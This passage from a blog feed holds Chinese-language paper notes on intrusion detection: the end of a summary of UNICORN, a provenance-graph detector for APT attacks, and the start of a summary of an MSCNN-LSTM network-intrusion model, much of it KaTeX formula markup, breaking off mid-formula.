sketch，然后将其与在建模阶段学习到的所有子模型进行比对，sketch要么符合当前的状态，要么符合接下来的状态，否则便认为是异常的。因此，我们可能检测到两种类型的异常行为：不符合已经存在的簇；簇之间的转换时无效的。</p><h1 id="6-实现"><a class="markdownIt-Anchor" href="#6-实现"></a> 6 实现</h1><p>图处理算法使用C++部署<strong>GraphChi</strong>（vertex-centric 图处理框架）；数据解析和建模部分使用Python。</p><h1 id="7-评估"><a class="markdownIt-Anchor" href="#7-评估"></a> 7 评估</h1><p>评估旨在验证以下问题：</p><ul><li>UNICORN能否在长期运行的系统中，准确地检测APT攻击的异常行为</li><li>针对APT的特性做出的设计决策有多重要？</li><li>UNICORN的“逐渐忘记”策略是否能更好地理解系统行为？</li><li>相比于现存的使用静态快照进行聚类的方法，UNICORN的进化模型是否更有效？</li><li>UNICORN是否足够快速，以执行实时监视和检测？</li><li>在系统执行过程中，UNICORN的内存和CPU使用如何？</li></ul><p>数据集采用DARPA TC3的三个APT攻击数据集：Cadets、ClearScope、THEIA</p><h2 id="71-unicorn-vs-streamspot"><a class="markdownIt-Anchor" href="#71-unicorn-vs-streamspot"></a> 7.1 UNICORN vs. StreamSpot</h2><ul><li>SteamSpot数据集（public available）如下</li></ul><p><img src="https://img-blog.csdnimg.cn/2020031421442473.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><p>StreamSpot包含6个场景的信息流图，其中5个时良性的。每个场景运行100次，每次生成一个graph。使用Linux的SystemTap日志系统。</p><p>我们使用这个数据集将UNICORN与StreamSpot对比，结果如下：</p><p><img src="https://img-blog.csdnimg.cn/20200314214437843.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /><br /><img src="https://img-blog.csdnimg.cn/20200314214447373.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" /></p><h2 id="72-darpa-tc-datasets"><a class="markdownIt-Anchor" href="#72-darpa-tc-datasets"></a> 7.2 DARPA TC Datasets</h2><p><img src="https://img-blog.csdnimg.cn/20200314214656424.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><p>参考文献中有关于者三个DARPA数据集的详细介绍。</p><p>本文将良性数据集的90%用于训练，10%用于测试；sketch size为200，R=3，检测结果如下：</p><p><img src="https://img-blog.csdnimg.cn/20200314214705789.png" alt="" /></p><h2 id="73-supply-chain攻击场景"><a class="markdownIt-Anchor" href="#73-supply-chain攻击场景"></a> 7.3 Supply Chain攻击场景</h2><p>前面的攻击场景无法确保异常行为和正常行为之间的相似性，因此本文在Continuous Integration（CI）平台上单独设计了两个APT攻击场景，并使用CamFlow（v0.5.0）来捕获whole-system provenance，其中每个场景运行了3天。</p><p><img src="https://img-blog.csdnimg.cn/20200314214718306.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><p>将125个良性图分成五组进行5折交叉验证，来为正常行为进行建模。下图是实验的设置和结果：</p><p><img src="https://img-blog.csdnimg.cn/20200314214732337.png" alt="" /><br /><img src="https://img-blog.csdnimg.cn/2020031421474942.png" alt="" /></p><h2 id="74-参数分析"><a class="markdownIt-Anchor" href="#74-参数分析"></a> 7.4 参数分析</h2><p>下面通过调整图VII中的各个Baseline参数，来观察性能变化，其中各个参数的概念如下：</p><ul><li>Batch Size（BS）：向GraphChi中一次提交的边的数量，它并不影响检测性能</li><li>Hop Count（HC）：这定义了用于表征每个顶点的邻域的大小； 它衡量了sketch中特征的表现力。 跳数越大，捕获的上下文信息越多，其中一些可能无关紧要。</li><li>Sketch Size（SS）：这是我们的固定大小直方图表示。SS越大，UNICORN可以包含有关演化图的更多信息，从而减少误差。但是，较大的SS最终会导致聚类中的维度灾难。</li><li>Interval of Sketch Generation（SG）：这是构造新sketch之间添加到图的边数。较小的SG会使得相邻的sketch之间较为相似，这会产生较高的false negative和较低的recall、accuracy（为何？不应该仅仅是性能开销增大吗？）；较大的SG会产生粗粒度的变化，同样使得sketch之间相似度较高</li><li>Weighted Decay Factor（DF）：该参数确定了我们忘记过去的比例。</li></ul><p><img src="https://img-blog.csdnimg.cn/20200314214802956.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><h2 id="75-处理速度"><a class="markdownIt-Anchor" href="#75-处理速度"></a> 7.5 处理速度</h2><p>实验环境为Amazon EC2 i3.2xlarge Linux machines with 8 vCPUs and 61GiB of memory.</p><p>下图表示了随时间推移处理的边缘总数，以量化UNICORN的处理速度。CamFlow线（蓝色）表示捕获系统生成的边总数，其他线与该线越近，说明运行时性能越好，这意味着UNICORN与捕获系统CamFlow“保持一致”</p><p><img src="https://img-blog.csdnimg.cn/20200314214812821.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><p>总体而言，上图表明UNICORN运行时对这些参数相对来说不敏感，这意味着UNICORN可以使用针对检测进行精度优化的参数，执行实时入侵检测。</p><h2 id="76-cpu-内存使用"><a class="markdownIt-Anchor" href="#76-cpu-内存使用"></a> 7.6 CPU &amp; 内存使用</h2><p>我们针对工作量相对较大（即CI执行内核编译）的系统评估UNICORN的CPU使用率和内存开销。 实验表明，UNICORN具有较低的CPU使用率和内存开销.</p><p>下图展示了CPU开销：</p><p><img src="https://img-blog.csdnimg.cn/2020031421482276.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><p>下图展示了在两个不同参数下，相同工作负载的内存开销，基本配置中的其他参数不会显着影响内存消耗：<br /><img src="https://img-blog.csdnimg.cn/20200314214841930.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><h2 id="77-讨论-局限性"><a class="markdownIt-Anchor" href="#77-讨论-局限性"></a> 7.7 讨论 &amp; 局限性</h2><ul><li>基于异常的检测</li></ul><p>首先，本文假设在UNICORN进行正常行为建模期间，系统是安全的；其次，本文假设存在详尽的、有限的系统行为模式，而且即使在运行过程中没有检测到全部，也检测到了大多数，因此如果如果UNICORN检测到未知的正常行为模式，就会产生误报。</p><p>再者，攻击者想要模仿正常行为来绕过UNICORN的检测也是比较难的。</p><p>另外，UNICORN监视系统的起点是和两性模型建模的起点是一样的。但是如果因为系统发生了错误而恢复到之前的状态时，就会导致系统状态与模型不匹配。解决这种问题的方法是在系统创建快照的同时保存其模型状态，当系统还原快照时，UNICORN将还原相应的模型状态。（Concept Drift？）</p><p>另外，UNICORN还需要定期的重新训练模型。</p><ul><li>图分析</li></ul><p>需要对每个系统调整参数来提升检测性能。本文使用OpenTuner来自动调整。在本文的实验中，对于大多数数据集而言，都可以使用相同的参数</p><ul><li>异质的主机活动</li></ul><p>一些主机只会执行一些预先定义好的任务，UNICORN对这样环境下的主机检测效果较好。然而一些主机会有各种各样的异质性行为，UNICORN没有考虑这一类主机的安全性</p><h1 id="8-相关研究"><a class="markdownIt-Anchor" href="#8-相关研究"></a> 8 相关研究</h1><ul><li><strong>基于主机的动态入侵检测</strong></li></ul><p>起初，IDS仅仅依靠系统调用来进行建模，但随着攻击技术的提升，检测的准确度也随之下降。所以下一代的IDS在系统调用中加入和“状态”来提供上下文信息。</p><p>UNICORN的方法完全不同，基于图的表示和分析在检测APT攻击上具有良好的表现</p><ul><li><strong>基于图的异常检测</strong></li><li><strong>基于Provenance的安全分析</strong></li></ul><p>有ProTracer、CamQuery、Holmes、SLUETH、Poirot、SAQL</p><p>UNICORN不同于传统的基于规则的系统，它是一个不需要专家知识的异常检测系统。</p><h1 id="9-总结"><a class="markdownIt-Anchor" href="#9-总结"></a> 9 总结</h1><p>本文提出了UNICORN，这是一种实时异常检测系统，它利用整个whole-system data provenance来检测高级持续威胁。  UNICORN通过结构化的Provenance Graph，对系统行为进行建模，Provenance Graph揭示了系统对象之间的因果关系，并在其流到分析管道中时，对其进行有效地汇总来考虑整个图。 我们的评估表明，由此产生的演化模型，可以成功地检测出从不同审计系统捕获的各种APT攻击，包括真实的APT活动，且准确性高、误报率低。</p><p>​</p>]]></content>
      
      
      <categories>
          
          <category> 科研 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 科研 </tag>
            
            <tag> APT </tag>
            
            <tag> 入侵检测 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PaperNote-基于时空特征融合的入侵检测系统模型</title>
      <link href="/2020/03/05/PaperNote-%E5%9F%BA%E4%BA%8E%E6%97%B6%E7%A9%BA%E7%89%B9%E5%BE%81%E8%9E%8D%E5%90%88%E7%9A%84%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F%E6%A8%A1%E5%9E%8B/"/>
      <url>/2020/03/05/PaperNote-%E5%9F%BA%E4%BA%8E%E6%97%B6%E7%A9%BA%E7%89%B9%E5%BE%81%E8%9E%8D%E5%90%88%E7%9A%84%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F%E6%A8%A1%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<p>原文标题：Model of the intrusion detection system based on the integration of spatial-temporal features</p><p>原文作者：Jianwu Zhang, Yu Ling, Xingbing Fu, Xiongkun Yang, Gang Xiong, Rui Zhang</p><p>原文来源：Computers &amp; Security 2020</p><p>原文链接：<a href="https://www.sciencedirect.com/science/article/pii/S0167404819302214" target="_blank" rel="noopener">https://www.sciencedirect.com/science/article/pii/S0167404819302214</a></p><h1 id="1-简介"><a class="markdownIt-Anchor" href="#1-简介"></a> 1 简介</h1><p>传统的机器学习方法，如SVM、贝叶斯网络、聚类等，当数据集的规模较小、维度较低时，具有较好的分类效果。但是，在实际的网络环境中，存在大量的高维、无标签、非线性数据，这就要求我们建立新的入侵检测模型。</p><p>本文提出了一种模型，将多<kbd>尺度卷积神经网络</kbd>和<kbd>长短期记忆</kbd>相结合（Multiscale Convolutional Neural Network with Long Short-Term Memory，<kbd>MSCNN-LSTM</kbd>）。模型首先使用多尺度卷积神经网络（MSCNN）分析数据集的<kbd>空间特征</kbd>(spatial features)，然后使用长短期记忆（LSTM）网络处理<kbd>时间特征</kbd>（temporal features）。 最后，该模型利用<kbd>时空特征</kbd>（spatial-temporal features）进行分类。 在实验中，使用公共入侵检测数据集<kbd>UNSW-NB15</kbd>作为实验训练集和测试集。 与基于传统神经网络的模型相比，MSCNN-LSTM模型具有更好的准确性，误报率和误报率。</p><h1 id="2-相关工作"><a class="markdownIt-Anchor" href="#2-相关工作"></a> 2 相关工作</h1><h2 id="21-入侵检测系统"><a class="markdownIt-Anchor" href="#21-入侵检测系统"></a> 2.1 入侵检测系统</h2><p>IDS分类：</p><ul><li>基于特征的检测系统（signature-based）</li></ul><p>通过分析已知的攻击模式，提取流量特征；然后将这些特征与后续检测系统提取的特征进行比较，以发现后续的攻击流量并发出警告。 基于特征的检测系统的优点是准确率高，但无法分析未知的攻击方式，如0-day漏洞攻击和APT（Advanced Persistent Threat）攻击 。</p><ul><li>基于异常的检测系统（anomaly-based）</li></ul><p>也称为基于网络行为的检测系统，主要依赖于传统的机器学习和深度学习算法。 在这种方法中，首先提取部分流量特征；然后使用有监督或无监督的学习方法，基于这些特征来构建学习框架。 基于网络行为的检测系统可以检测正常和恶意网络流量， 这种方法的好处是它可以检测未知攻击。但该方法的困难的是，设计一组代表性的特征来检测网络流量并训练模型。</p><h2 id="22-深度神经网络"><a class="markdownIt-Anchor" href="#22-深度神经网络"></a> 2.2 深度神经网络</h2><ul><li>卷积神经网络CNN</li></ul><p>主要用于提取数据集的空间特征</p><ul><li>递归神经网络RNN</li></ul><p>为神经网络中的每个节点添加了一个<kbd>自相关加权值</kbd>作为记忆单元，可以记忆神经网络之前的状态</p><ul><li>长短期记忆网络LSTM</li></ul><p>LSTM在RNN的结构中中添加了<kbd>忘记门</kbd>，因此LSTM网络可以有效地从长序列中提取时间特征</p><p>时空特征是入侵检测系统中最常用的两个检测特征。目前的研究方法都应用CNN或RNN来构建单个模型，这显然不够全面。</p><p>数据流量中的“字节、数据包、数据流”和自然语言处理中的“字符、句子、段落”非常相似。因此，对网络流量的分类类似于将自然语言中的段落分为正样本和负样本。</p><h1 id="3-mscnn-lstm设计"><a class="markdownIt-Anchor" href="#3-mscnn-lstm设计"></a> 3 MSCNN-LSTM设计</h1><p><img src="https://s2.ax1x.com/2020/03/08/3xUrRg.png" alt="MSCNN—LSTM模型学习过程" /></p><h2 id="31-数据选择"><a class="markdownIt-Anchor" href="#31-数据选择"></a> 3.1 数据选择</h2><p>由于KDDCUP99和NSL-KDD年代过于久远，本文采用公开数据集<kbd>UNSW-NB15</kbd>.</p><h2 id="32-数据处理"><a class="markdownIt-Anchor" href="#32-数据处理"></a> 3.2 数据处理</h2><p>包括数据标准化和数据格式转换。原始数据中，每条数据都有49个特征和1个标签，其标签为“attack”和“normal”，为了以数据流的形式将数据输入到神经网络中，必须要将字符型属性转化为数值型。</p><p>数据集包括9中类型的异常行为：Fuzzers, Analysis, Backdoors, DoS, Exploits, Generic, Reconnaissance, Shellcode and Worms</p><p>特征可以分为以下几类：流量特征，基本特征，内容特征，时间特征，附加生成的特征、标签特征。</p><p>数据集的49个特征中，显然存在一部分冗余。因此使用前人所得出的特征子集，这些特征子集是通过使用遗传算法作为特征搜索策略，并使用逻辑回归作为分类器来获得的，如下表所示：</p><p><img src="https://s2.ax1x.com/2020/03/08/3xU6Mj.png" alt="特征子集" /></p><h3 id="321-数据标准化standardization"><a class="markdownIt-Anchor" href="#321-数据标准化standardization"></a> 3.2.1 数据标准化（standardization）</h3><p>特征‘proto’、‘state’、‘service’、‘attack_act’的值都是字符型的，我们将其转化为数字型。比如特征‘proto’，将其三个最重要的值‘tcp’、‘udp’、‘icmp’分别映射为1、2、3，其余协议映射为4.</p><h3 id="322-数据归一化normalization"><a class="markdownIt-Anchor" href="#322-数据归一化normalization"></a> 3.2.2 数据归一化（normalization）</h3><p>通过线性转换，将特征值归一化到[0, 1]区间内：</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.15999999999999992em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mfrac><mrow><mi>x</mi><mo>−</mo><msub><mi>x</mi><mi>min</mi><mo>⁡</mo></msub></mrow><mrow><msub><mi>x</mi><mi>max</mi><mo>⁡</mo></msub><mo>−</mo><msub><mi>x</mi><mi>min</mi><mo>⁡</mo></msub></mrow></mfrac><mo separator="true">,</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>x</mi><mi>max</mi><mo>⁡</mo></msub><mi mathvariant="normal">≠</mi><msub><mi>x</mi><mi>min</mi><mo>⁡</mo></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>0</mn><mo separator="true">,</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>x</mi><mi>max</mi><mo>⁡</mo></msub><mo>=</mo><msub><mi>x</mi><mi>min</mi><mo>⁡</mo></msub></mrow></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding="application/x-tex">f(x)=\left\{\begin{array}{ll}\frac{x-x_{\min }}{x_{\max }-x_{\min }}, &amp; x_{\max } \neq x_{\min } \\ 0, &amp; x_{\max }=x_{\min }\end{array}\right.</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.4850999999999996em;vertical-align:-0.99255em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">{</span></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.4925499999999996em;"><span style="top:-3.6525499999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8184309999999999em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.16454285714285719em;"><span style="top:-2.1645428571428575em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.3075428571428573em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mop mtight">max</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mbin mtight">−</span><span class="mord mtight"><span class="mord mathdefault mtight">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3340428571428572em;"><span style="top:-2.3340428571428573em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.477042857142857em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mop mtight">min</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.4101em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">x</span><span class="mbin mtight">−</span><span class="mord mtight"><span class="mord mathdefault mtight">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3340428571428572em;"><span style="top:-2.3340428571428573em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.477042857142857em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mop mtight">min</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.44509999999999994em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mpunct">,</span></span></span><span style="top:-2.36745em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span><span class="mpunct">,</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.99255em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.4925499999999996em;"><span style="top:-3.6525499999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.151392em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.301392em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mop mtight">max</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mrel"><span class="mord"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.69444em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="rlap"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="inner"><span class="mrel"></span></span><span class="fix"></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.19444em;"><span></span></span></span></span></span></span><span class="mrel">=</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31750199999999995em;"><span style="top:-2.317502em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.467502em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mop mtight">min</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.36745em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.151392em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.301392em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mop mtight">max</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31750199999999995em;"><span style="top:-2.317502em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.467502em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mop mtight">min</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.99255em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></p><h2 id="33-特征学习过程"><a class="markdownIt-Anchor" href="#33-特征学习过程"></a> 3.3 特征学习过程</h2><p>整个数据流图像的空间特征，是CNN从单个的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>p</mi><mo>×</mo><mi>q</mi></mrow><annotation encoding="application/x-tex">p \times q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span></span></span></span>图像中学到，如下图所示，然后MSCNN的输出结构是单个的数据流向量。</p><p>LSTM从多个数据流向量中学习时间特征，如下图所示，输出是代表网络数据流时空特征的、单个的数据流向量，它将根据提取出的特征被进行分类。</p><p><img src="https://s2.ax1x.com/2020/03/08/3xURZq.png" alt="特征学习过程" /></p><h2 id="34-多尺度卷积multiscale-convolution"><a class="markdownIt-Anchor" href="#34-多尺度卷积multiscale-convolution"></a> 3.4 多尺度卷积（multiscale convolution）</h2><p>对于网络流量的识别，不仅需要分散的局部特征（local feature），也需要将多个局部特征联合起来进行分类，因此将CNN调整为MSCNN。本文使用多个大小不同的<kbd>卷积核</kbd>来提取特征，并将它们组合以获得多组局部特征。MSCNN结构将基于<strong>三个原始的多尺度卷积层</strong>（每层有多个卷积核进行采集），<strong>三个卷积层</strong>，<strong>一个池化层</strong>和<strong>三个全连接层</strong>， 网络结构参数如下表所示：</p><p><img src="https://s2.ax1x.com/2020/03/08/3xUoz4.png" alt="MSCNN模型层级结构" /></p><p>MS卷积采用了三个不同尺度的卷积核，因为2×2、3×3的卷积是比较耗时的，所以在之前先进行1×1的卷积操作来降低特征空间的维度：</p><p><img src="https://s2.ax1x.com/2020/03/08/3xUbLR.png" alt="" /></p><ul><li>关于1×1卷积核</li></ul><p>如果当前层和下一层都只有一个通道，那么1×1卷积核确实没什么作用，但是如果它们分别为m层和n层的话，1×1卷积核可以起到一个跨通道聚合的作用，所以进一步可以起到降维（或者升维）的作用，起到减少（或增加）参数的目的。</p><p><img src="https://pic3.zhimg.com/80/v2-59429b22ac90930c502736b33db0d8e0_720w.jpg" alt="" /></p><h2 id="35-lstm网络"><a class="markdownIt-Anchor" href="#35-lstm网络"></a> 3.5 LSTM网络</h2><h3 id="351-rnn"><a class="markdownIt-Anchor" href="#351-rnn"></a> 3.5.1 RNN</h3><p>首先介绍一下传统的<strong>递归神经网络</strong>（<strong>Recurrent neural network</strong>: <strong>RNN</strong>）：</p><p><img src="https://pic4.zhimg.com/80/v2-f716c816d46792b867a6815c278f11cb_720w.jpg" alt="" /></p><ul><li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">x</span></span></span></span>为当前状态下数据的输入</li><li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>h</mi></mrow><annotation encoding="application/x-tex">h</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">h</span></span></span></span>表示接收到的上一个节点的输入</li><li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>y</mi></mrow><annotation encoding="application/x-tex">y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span></span>为当前节点状态下的输出</li><li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>h</mi><mo mathvariant="normal">′</mo></msup></mrow><annotation encoding="application/x-tex">h^{\prime}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.751892em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">h</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span>为传递到下一个节点的输出</li></ul><p>通过上图的公式可以看到，输出 <strong>h’</strong> 与 <strong>x</strong> 和 <strong>h</strong> 的值都相关。而 <strong>y</strong> 则常常使用 <strong>h’</strong> 投入到一个线性层（主要是进行维度映射）然后使用softmax进行分类得到需要的数据。这里的<strong>y</strong>如何通过 <strong>h’</strong> 计算得到往往看具体模型的使用方式。通过序列形式的输入，我们能够得到如下形式的RNN：</p><p><img src="https://pic2.zhimg.com/80/v2-71652d6a1eee9def631c18ea5e3c7605_720w.jpg" alt="" /></p><h3 id="352-lstm"><a class="markdownIt-Anchor" href="#352-lstm"></a> 3.5.2 LSTM</h3><p>LSTM是一种特殊的RNN，主要是为了解决<strong>长序列训练过程中的梯度消失和梯度爆炸</strong>问题。简单来说，就是相比普通的RNN，LSTM能够在更长的序列中有更好的表现。</p><p>LSTM结构（右图）和普通RNN（左图）的主要输入输出区别如下所示：</p><p><img src="https://pic4.zhimg.com/80/v2-e4f9851cad426dfe4ab1c76209546827_720w.jpg" alt="" /></p><p>相比RNN只有一个传递状态<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>h</mi><mi>t</mi></msup></mrow><annotation encoding="application/x-tex">h^t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7935559999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">h</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7935559999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">t</span></span></span></span></span></span></span></span></span></span></span>，LSTM有两个传输状态，<span class="katex"><span 